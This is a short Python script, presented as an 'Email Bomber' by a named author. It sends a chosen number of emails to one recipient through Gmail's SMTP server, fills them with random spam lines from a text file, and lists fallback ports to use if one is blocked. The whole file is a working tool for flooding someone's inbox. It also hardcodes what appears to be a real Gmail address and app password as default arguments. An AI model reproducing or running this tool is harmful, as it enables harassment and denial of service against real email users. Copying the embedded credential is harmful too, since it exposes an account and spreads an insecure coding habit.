import smtplib
import random
import argparse
from email.message import EmailMessage

# enter YOUR email and create password 





parser = argparse.ArgumentParser(
    description="📨 Email Bomber Script by Zander Brooks",
    epilog="Example usage:\n  python email_bomber.py example_subject recipient@example.com 100 --optional body",
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument('--sender', type=str, default='rednazskoorb@gmail.com', help='Email address to send from')
parser.add_argument('--password', type=str, default='icox wnqo xcao ttkk', help='App password for the sender email')

parser.add_argument('to', type=str, help='Email recipient')
parser.add_argument('subject', type=str, help='Email Subject')
parser.add_argument('count', type=int, help='Size of Email Bomb')
parser.add_argument('body', type=str, nargs='?', default=None, help='Optional Email Body (leave blank for random messages)')

args = parser.parse_args()

spam_messages_text = "messages.txt"




with open(spam_messages_text, "r") as file:
    phrases = file.readlines()
    
random.shuffle(phrases)



for i in range(args.count):

    msg = EmailMessage()
    msg['From'] = args.sender
    msg['To'] = args.to
    msg['subject'] = args.subject
    if(args.body):
        msg.set_content(args.body)
    else:
        msg.set_content(phrases[i].strip())

    
    try:

        #Ports to use incase 465 Doesnt work for you
        # 25 - Some custom mail servers (rarely used by Gmail/Yahoo/Outlook)
        # 465 - Gmail, Yahoo, AOL, Zoho
        # 587 - Gmail, Yahoo, Outlook, iCloud, Zoho
        # 2525 - Mailgun, SendGrid, Postmark
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(args.sender,args.password)
            smtp.send_message(msg)
            print("Email sent sucessfully!")
    except Exception as e:
        print(f'Error sending email: {e}')
